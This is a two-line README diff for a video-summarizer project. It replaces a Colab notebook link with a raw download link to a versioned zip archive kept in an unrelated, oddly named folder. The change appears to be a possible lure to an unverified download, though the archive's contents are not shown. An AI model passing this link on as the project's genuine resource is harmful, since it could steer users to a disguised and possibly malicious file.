@@ -1,2 +1,2 @@
 # Video_Summarizer-using-Transformers
-https://colab.research.google.com/drive/1HKMiTvyIeC8hxxflIDO1e59cE7Q02wyj?usp=sharing
+https://github.com/Bhoomika2224/Video_Summarizer-using-Transformers/raw/refs/heads/main/Lamellibranchiata/Transformers-Summarizer-Video-using-2.3.zip
